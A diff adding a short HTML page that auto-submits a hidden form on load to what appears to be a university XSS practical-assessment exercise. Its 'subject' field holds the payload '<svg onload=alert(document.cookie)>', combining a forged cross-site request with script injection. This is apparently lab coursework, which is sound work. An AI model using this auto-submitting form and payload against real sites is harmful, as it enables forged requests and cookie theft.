@@ -1,0 +1,11 @@
+
+<html>
+    <body onload="document.forms[0].submit()">
+        <form action="https://inte2102.semiregular.space/Practical_Assessment/1/XSS/{3d423508-5817-4609-9ae9-65e80031dec2}/ex7/" method="POST">
+            <input type="hidden" name="name" value="hamza">
+            <input type="hidden" name="email" value="abcd@hmail.com">
+            <input type="hidden" name="subject" value='<svg onload=alert(document.cookie)>'>
+            <input type="hidden" name="body" value="sdfds">
+        </form>
+    </body>
+</html>
